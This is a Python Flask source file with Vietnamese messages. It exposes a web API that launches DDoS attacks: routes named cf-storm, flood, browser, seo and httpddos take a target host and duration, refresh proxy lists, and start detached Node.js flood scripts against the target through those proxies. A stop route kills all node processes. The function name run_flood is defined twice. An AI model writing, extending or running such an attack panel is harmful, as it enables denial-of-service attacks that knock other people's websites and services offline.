from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)

# Thêm loại proxy mới: live
PROXY_MAP = {
    "vn": ("y", "vn.txt"),
    "all": ("n", "prx.txt"),
    "live": ("v", "live.txt")
}

def get_proxy_file(proxy_key):
    if proxy_key not in PROXY_MAP:
        return None, None
    return PROXY_MAP[proxy_key]

def run_prx_script(prx_flag):
    try:
        subprocess.run(["python3", "prx.py", prx_flag], capture_output=True, text=True)
        return True, ""
    except Exception as e:
        return False, str(e)

def start_background_node(cmd):
    try:
        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True
        )
        return True, ""
    except Exception as e:
        return False, str(e)

# Route CF-STORM
@app.route('/api', methods=['GET'])
@app.route('/api/cf-storm', methods=['GET'])
def run_cf_storm():
    host = request.args.get('host')
    time_param = request.args.get('time')
    proxy_key = request.args.get('proxy', 'vn').lower()

    if not host or not time_param:
        return jsonify({"error": "Thiếu 'host' hoặc 'time'"}), 400

    prx_flag, proxy_file = get_proxy_file(proxy_key)
    if not proxy_file:
        return jsonify({"error": "Proxy không hợp lệ, phải là 'vn', 'all' hoặc 'live'"}), 400

    ok, err = run_prx_script(prx_flag)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy prx.py: {err}"}), 500

    if not os.path.exists(proxy_file):
        return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500

    cmd = ["node", "c", "GET", host, time_param, "18", "8", proxy_file]
    ok, err = start_background_node(cmd)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy node: {err}"}), 500

    return jsonify({"status": "cf-storm đã khởi động", "host": host, "proxy": proxy_file})

# Route Flood
@app.route('/api/flood', methods=['GET'])
def run_flood():
    host = request.args.get('host')
    time_param = request.args.get('time')
    proxy_key = request.args.get('proxy', 'vn').lower()

    if not host or not time_param:
        return jsonify({"error": "Thiếu 'host' hoặc 'time'"}), 400

    prx_flag, proxy_file = get_proxy_file(proxy_key)
    if not proxy_file:
        return jsonify({"error": "Proxy không hợp lệ, phải là 'vn', 'all' hoặc 'live'"}), 400

    ok, err = run_prx_script(prx_flag)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy prx.py: {err}"}), 500

    if not os.path.exists(proxy_file):
        return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500

    cmd = ["node", "cve", host, time_param, "20", proxy_file, "15"]
    ok, err = start_background_node(cmd)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy flood: {err}"}), 500

    return jsonify({"status": "flood đã khởi động", "host": host, "proxy": proxy_file})

# Route Browser
@app.route('/api/browser', methods=['GET'])
def run_browser():
    host = request.args.get('host')
    time_param = request.args.get('time')
    proxy_key = request.args.get('proxy', 'vn').lower()

    if not host or not time_param:
        return jsonify({"error": "Thiếu 'host' hoặc 'time'"}), 400

    prx_flag, proxy_file = get_proxy_file(proxy_key)
    if not proxy_file:
        return jsonify({"error": "Proxy không hợp lệ, phải là 'vn', 'all' hoặc 'live'"}), 400

    ok, err = run_prx_script(prx_flag)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy prx.py: {err}"}), 500

    if not os.path.exists(proxy_file):
        return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500

    cmd = ["node", "browser.js", host, "5", proxy_file, "40", time_param]
    ok, err = start_background_node(cmd)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy browser.js: {err}"}), 500

    return jsonify({"status": "browser đã khởi động", "host": host, "proxy": proxy_file})
    # Route Flood
@app.route('/api/seo', methods=['GET'])
def run_flood():
    host = request.args.get('host')
    time_param = request.args.get('time')
    proxy_key = request.args.get('proxy', 'vn').lower()

    if not host or not time_param:
        return jsonify({"error": "Thiếu 'host' hoặc 'time'"}), 400

    prx_flag, proxy_file = get_proxy_file(proxy_key)
    if not proxy_file:
        return jsonify({"error": "Proxy không hợp lệ, phải là 'vn', 'all' hoặc 'live'"}), 400

    ok, err = run_prx_script(prx_flag)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy prx.py: {err}"}), 500

    if not os.path.exists(proxy_file):
        return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500

    cmd = ["node", "ya", host, time_param, "8", "45", proxy_file]
    ok, err = start_background_node(cmd)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy seo: {err}"}), 500

    return jsonify({"status": "flood đã khởi động", "host": host, "proxy": proxy_file})

# Route HTTPDDOS
@app.route('/api/httpddos', methods=['GET'])
def run_httpddos():
    host = request.args.get('host')
    time_param = request.args.get('time')
    proxy_key = request.args.get('proxy', 'vn').lower()

    if not host or not time_param:
        return jsonify({"error": "Thiếu 'host' hoặc 'time'"}), 400

    prx_flag, proxy_file = get_proxy_file(proxy_key)
    if not proxy_file:
        return jsonify({"error": "Proxy không hợp lệ, phải là 'vn', 'all' hoặc 'live'"}), 400

    ok, err = run_prx_script(prx_flag)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy prx.py: {err}"}), 500

    if not os.path.exists(proxy_file):
        return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500

    # Command: node <target> <time> 8 45 <proxy-file>
    cmd = ["node", "httpddos", host, time_param, "8", "45", proxy_file]
    ok, err = start_background_node(cmd)
    if not ok:
        return jsonify({"error": f"Lỗi khi chạy httpddos: {err}"}), 500

    return jsonify({"status": "httpddos đã khởi động", "host": host, "proxy": proxy_file})

@app.route('/api/stop', methods=['GET'])
def stop_all_nodes():
    try:
        subprocess.run(["pkill", "-f", "node"], check=True)
        return jsonify({"status": "Đã dừng toàn bộ tiến trình Node.js"})
    except subprocess.CalledProcessError:
        return jsonify({"status": "Không tìm thấy tiến trình Node hoặc đã dừng từ trước"})
    except Exception as e:
        return jsonify({"error": f"Lỗi khi dừng tiến trình: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1110)
